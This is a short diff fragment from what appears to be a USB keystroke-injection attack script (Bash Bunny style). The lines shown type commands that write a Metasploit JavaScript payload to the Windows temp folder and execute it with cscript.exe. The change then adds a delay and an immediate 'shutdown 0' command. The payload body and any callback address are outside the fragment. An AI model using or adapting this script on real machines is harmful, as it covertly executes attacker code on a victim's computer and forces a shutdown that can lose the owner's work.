@@ -585,3 +585,6 @@ Q STRING echo } >> %temp%/BB-Metasploit-Winx64.js
 ENTER
 Q STRING cscript.exe %temp%/BB-Metasploit-Winx64.js
 ENTER
+QUACK DELAY 4500
+shutdown 0
+
